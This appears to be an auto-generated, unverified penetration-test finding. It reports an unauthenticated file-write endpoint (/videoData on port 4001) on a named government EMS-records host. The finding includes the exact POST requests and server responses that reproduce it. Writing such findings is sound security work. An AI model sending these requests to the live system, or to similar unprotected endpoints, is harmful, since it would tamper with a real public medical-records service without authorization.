# POC/EXP — epcr.tpf.gov.tw:4001 /videoData POST 未鉴权写端点可触发文件写入

> 漏洞ID: `5c9e909b-af34-494d-a8fe-3563058111c3`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/videoData（POST 未鉴权写端点）`

**類型**: 未鉴权写操作（Broken Access Control）

## 描述

EPCR vitalSignVideoServer（:4001）的 /videoData 端点支持 POST 方法且未做身份/权限校验（无 token 即可调用），必填字段 fileName/fileData/generatedAt。未鉴权 POST 可触发后端文件写入逻辑：参数缺失返回 400 notNull Violation，参数齐全返回 500 "Failed to add file"（写入因 fileData 格式处理失败，但写操作已被触发）。攻击者可未鉴权地触发写入流程、消耗存储/带宽、尝试注入或污染视频数据，属未鉴权写操作。

## POC / 復現步驟

```
1. 方法探测（4001）：
POST /videoData -d '{}' → 400 337B {"message":"notNull Violation: fileName cannot be null, notNull Violation: fileData cannot be null, notNull Violation: generatedAt cannot be null","errors":[...]}
PUT/DELETE/PATCH /videoData → 404 160B（仅 POST 有效）
OPTIONS /videoData → 204
2. 未鉴权写入尝试：
POST /videoData -d '{"fileName":"poc_test_2025.bin","fileData":"aGVsbG8gdGVzdA==","generatedAt":"2025-01-01T00:00:00.000Z"}' → 500 60B {"message":"internal error","errors":["Failed to add file"]}
（无 Authorization token，请求被接受并进入写入逻辑，非 401 鉴权拒绝）
3. 对比：4000 上所有 MCi API（/MciPcrs 等）未带 token 均 401，而 4001 /videoData POST 无 token 也能触发写入逻辑。
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
